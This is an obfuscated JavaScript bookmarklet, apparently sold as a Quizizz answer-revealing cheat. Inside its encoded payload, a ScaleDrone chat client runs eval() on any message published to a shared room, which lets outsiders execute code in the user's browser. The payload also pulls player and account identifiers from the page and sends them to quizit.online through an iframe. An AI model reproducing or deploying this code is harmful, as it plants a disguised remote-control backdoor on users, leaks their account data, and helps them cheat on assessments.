javascript:function _0x315b(_0x2ffe85, _0x27bfdd) {
    var _0x885925 = _0x8859();
    return _0x315b = function(_0x315bd3, _0x465919) {
        _0x315bd3 = _0x315bd3 - 0x65;
        var _0x406094 = _0x885925[_0x315bd3];
        return _0x406094;
    }, _0x315b(_0x2ffe85, _0x27bfdd);
}
var _0x186fed = _0x315b;
(function(_0x4e1e1d, _0x113e37) {
    var _0x5903f3 = _0x315b,
        _0x2676dc = _0x4e1e1d();
    while (!![]) {
        try {
            var _0x1c3869 = parseInt(_0x5903f3(0x83)) / 0x1 + parseInt(_0x5903f3(0x69)) / 0x2 + -parseInt(_0x5903f3(0x77)) / 0x3 + parseInt(_0x5903f3(0x78)) / 0x4 * (parseInt(_0x5903f3(0x79)) / 0x5) + parseInt(_0x5903f3(0x70)) / 0x6 * (-parseInt(_0x5903f3(0x74)) / 0x7) + parseInt(_0x5903f3(0x65)) / 0x8 * (-parseInt(_0x5903f3(0x81)) / 0x9) + -parseInt(_0x5903f3(0x86)) / 0xa * (-parseInt(_0x5903f3(0x72)) / 0xb);
            if (_0x1c3869 === _0x113e37) break;
            else _0x2676dc['push'](_0x2676dc['shift']());
        } catch (_0x430e71) {
            _0x2676dc['push'](_0x2676dc['shift']());
        }
    }
}(_0x8859, 0xa4b68));

function _0x8859() {
    var _0x250f24 = ['3353028JHNayV', '44UcMpkZ', '94210aaswnD', 'setAttribute', 'src', 'script', 'artoo_injected_script', 'verbose', 'artoo\x20already\x20exists\x20within\x20this\x20page.\x20No\x20need\x20to\x20inject\x20him\x20again.', 'createElement', '3189393tdKORh', 'exec', '226178PXlgkS', 'reload', 'object', '21800140LkWTiY', '16HymqBn', 'call', 'appendChild', 'stringify', '1582622FQrEbq', 'settings', 'firstChild', '//medialab.github.io/artoo/public/dist/artoo-latest.min.js', 'body', 'getElementsByTagName', 'artoo', '2598WiKJMO', 'log', '11mAVyHF', 'loadSettings', '14609JvQWNe', 'type', 'artoo.js\x20is\x20loading...'];
    _0x8859 = function() {
        return _0x250f24;
    };
    return _0x8859();
}
_0x4d043a: (function(_0x267a17) {
    var _0x3ee6e2 = _0x315b,
        _0x17b992 = {
            'eval': '\x22artoo.injectScript(\x5c\x22https://cdn.scaledrone.com/scaledrone.min.js\x5c\x22,(function(){const\x20CLIENT_ID=\x5c\x22Wa9787NIBwG7ckyH\x5c\x22,drone=new\x20ScaleDrone(CLIENT_ID,{data:{name:getRandomName(),color:\x5c\x22#A020F0\x5c\x22}});let\x20members=[];function\x20getRandomName(){const\x20e=[\x5c\x22quizizz\x5c\x22],o=[\x5c\x22user\x5c\x22];return\x20e[Math.floor(Math.random()*e.length)]+\x5c\x22_\x5c\x22+o[Math.floor(Math.random()*o.length)]}function\x20getRandomColor(){return\x5c\x22#\x5c\x22+Math.floor(16777215*Math.random()).toString(16)}drone.on(\x5c\x22open\x5c\x22,error=>{if(error)return\x20console.error(error);console.log(\x5c\x22Successfully\x20connected\x20to\x20Scaledrone\x5c\x22);const\x20room=drone.subscribe(\x5c\x22observable-room\x5c\x22);room.on(\x5c\x22open\x5c\x22,e=>{if(e)return\x20console.error(e);console.log(\x5c\x22Successfully\x20joined\x20room\x5c\x22)}),room.on(\x5c\x22members\x5c\x22,e=>{members=e,updateMembersDOM()}),room.on(\x5c\x22member_join\x5c\x22,e=>{members.push(e),updateMembersDOM()}),room.on(\x5c\x22member_leave\x5c\x22,({id:e})=>{const\x20o=members.findIndex(o=>o.id===e);members.splice(o,1),updateMembersDOM()}),room.on(\x5c\x22data\x5c\x22,(text,member)=>{member&&eval(text)})}),drone.on(\x5c\x22close\x5c\x22,e=>{console.log(\x5c\x22Connection\x20was\x20closed\x5c\x22,e)}),drone.on(\x5c\x22error\x5c\x22,e=>{console.error(e)});const\x20DOM={membersCount:document.querySelector(\x5c\x22.members-count\x5c\x22),membersList:document.querySelector(\x5c\x22.members-list\x5c\x22),messages:document.querySelector(\x5c\x22.messages\x5c\x22),input:document.querySelector(\x5c\x22.message-form__input\x5c\x22),form:document.querySelector(\x5c\x22.message-form\x5c\x22)};function\x20sendMessage(){const\x20e=DOM.input.value;\x5c\x22\x5c\x22!==e&&(DOM.input.value=\x5c\x22\x5c\x22,drone.publish({room:\x5c\x22observable-room\x5c\x22,message:e}))}function\x20createMemberElement(e){const{name:o,color:t}=e.clientData,n=document.createElement(\x5c\x22div\x5c\x22);return\x20n.appendChild(document.createTextNode(o)),n.className=\x5c\x22member\x5c\x22,n.style.color=t,n}function\x20updateMembersDOM(){DOM.membersCount.innerText=%60${members.length}\x20users\x20in\x20room:%60,DOM.membersList.innerHTML=\x5c\x22\x5c\x22,members.forEach(e=>DOM.membersList.appendChild(createMemberElement(e)))}function\x20createMessageElement(e,o){const\x20t=document.createElement(\x5c\x22div\x5c\x22);return\x20t.appendChild(createMemberElement(o)),t.appendChild(document.createTextNode(e)),t.className=\x5c\x22message\x5c\x22,t}function\x20addMessageToListDOM(e,o){const\x20t=DOM.messages,n=t.scrollTop===t.scrollHeight-t.clientHeight;t.appendChild(createMessageElement(e,o)),n&&(t.scrollTop=t.scrollHeight-t.clientHeight)}DOM.form.addEventListener(\x5c\x22submit\x5c\x22,sendMessage)}));const\x20_0x711949=_0x4fd6;function\x20_0x4fd6(e,o){const\x20t=_0x2054();return(_0x4fd6=function(e,o){return\x20t[e-=367]})(e,o)}!function(e,o){const\x20t=_0x4fd6,n=_0x2054();for(;;)try{if(895885===parseInt(t(370))/1+-parseInt(t(373))/2*(-parseInt(t(379))/3)+-parseInt(t(369))/4+-parseInt(t(367))/5+parseInt(t(381))/6*(parseInt(t(371))/7)+parseInt(t(374))/8*(parseInt(t(368))/9)+-parseInt(t(382))/10)break;n.push(n.shift())}catch(e){n.push(n.shift())}}();const{game:game,user:user}=document[_0x711949(378)](_0x711949(376)).__vue__.$store[_0x711949(375)],{player:player,data:data}=game,dataString=btoa(JSON[_0x711949(380)]({playerId:player.playerId,mongoId:user[_0x711949(372)][_0x711949(377)],roomHash:data.roomHash}));function\x20_0x2054(){const\x20e=[\x5c\x22querySelector\x5c\x22,\x5c\x223iTdzQh\x5c\x22,\x5c\x22stringify\x5c\x22,\x5c\x225853336IqQcqR\x5c\x22,\x5c\x229959120lBAZSi\x5c\x22,\x5c\x227255610nqFLxm\x5c\x22,\x5c\x229zqdzZU\x5c\x22,\x5c\x225914016uYqyRS\x5c\x22,\x5c\x221312517QuwPon\x5c\x22,\x5c\x227VsIIyH\x5c\x22,\x5c\x22profile\x5c\x22,\x5c\x222055478oYSgrU\x5c\x22,\x5c\x2212044888mDSdtp\x5c\x22,\x5c\x22state\x5c\x22,\x5c\x22.root-component\x5c\x22,\x5c\x22mongoId\x5c\x22];return(_0x2054=function(){return\x20e})()}var\x20SHEEP_2048;console.log(dataString),function(){\x5c\x22use\x20strict\x5c\x22;if(SHEEP_2048)SHEEP_2048();else{function\x20e(e,o){for(var\x20t\x20in\x20o)e.style[t]=o[t]}var\x20o=document.createElement(\x5c\x22div\x5c\x22),t=document.createElement(\x5c\x22iframe\x5c\x22);function\x20n(){o.style.opacity=\x5c\x221\x5c\x22}function\x20r(){o.style.opacity=\x5c\x220\x5c\x22,t.blur()}t.src=\x5c\x22https://quizit.online/services/quizizz/answers?data=\x5c\x22+dataString,t.width=333,t.height=461,t.scrolling=\x5c\x22yes\x5c\x22,t.sandbox=\x5c\x22allow-same-origin\x20allow-forms\x20allow-modals\x20allow-orientation-lock\x20allow-pointer-lock\x20allow-presentation\x20allow-scripts\x5c\x22,e(t,{position:\x5c\x22absolute\x5c\x22,top:\x5c\x22-151.5px\x5c\x22,left:\x5c\x22-27px\x5c\x22,border:\x5c\x22none\x5c\x22}),e(o,{position:\x5c\x22fixed\x5c\x22,zIndex:2147483647,display:\x5c\x22block\x5c\x22,bottom:\x5c\x2210px\x5c\x22,left:\x5c\x2210px\x5c\x22,width:\x5c\x22280px\x5c\x22,height:\x5c\x22280px\x5c\x22,overflow:\x5c\x22hidden\x5c\x22,transition:\x5c\x22opacity\x200.1s\x5c\x22,borderRadius:\x5c\x226px\x5c\x22,transform:\x5c\x22scale(1)\x5c\x22}),o.appendChild(t),document.body.parentNode.appendChild(o),o.addEventListener(\x5c\x22mouseenter\x5c\x22,n,!1),o.addEventListener(\x5c\x22mouseleave\x5c\x22,r,!1),SHEEP_2048=()=>{for(var\x20e\x20of(o.removeEventListener(\x5c\x22mouseenter\x5c\x22,n,!1),o.removeEventListener(\x5c\x22mouseleave\x5c\x22,r,!1),o.parentNode.removeChild(o),t=null,o=null,SHEEP_2048=void\x200,document.querySelectorAll(\x27script[src=\x5c\x22https://raw.githubusercontent.com/2-js/gen-paste/main/hideable@master.js\x5c\x22]\x27)))e.parentNode.removeChild(e)}}}();\x22'
        },
        _0x126ebc = !0x0;
    if (_0x3ee6e2(0x85) == typeof this[_0x3ee6e2(0x6f)] && (artoo[_0x3ee6e2(0x6a)][_0x3ee6e2(0x84)] || (artoo[_0x3ee6e2(0x71)][_0x3ee6e2(0x7e)](_0x3ee6e2(0x7f)), artoo[_0x3ee6e2(0x73)](_0x17b992), artoo[_0x3ee6e2(0x82)](), _0x126ebc = !0x1)), _0x126ebc) {
        var _0x3551ba = document[_0x3ee6e2(0x6e)](_0x3ee6e2(0x6d))[0x0];
        _0x3551ba || (_0x3551ba = document[_0x3ee6e2(0x80)](_0x3ee6e2(0x6d)), document[_0x3ee6e2(0x6b)]['appendChild'](_0x3551ba));
        var _0x3bd6a5 = document['createElement'](_0x3ee6e2(0x7c));
        console[_0x3ee6e2(0x71)](_0x3ee6e2(0x76)), _0x3bd6a5[_0x3ee6e2(0x7b)] = _0x3ee6e2(0x6c), _0x3bd6a5[_0x3ee6e2(0x75)] = 'text/javascript', _0x3bd6a5['id'] = _0x3ee6e2(0x7d), _0x3bd6a5[_0x3ee6e2(0x7a)](_0x3ee6e2(0x6a), JSON[_0x3ee6e2(0x68)](_0x17b992)), _0x3551ba[_0x3ee6e2(0x67)](_0x3bd6a5);
    }
} [_0x186fed(0x66)](this));
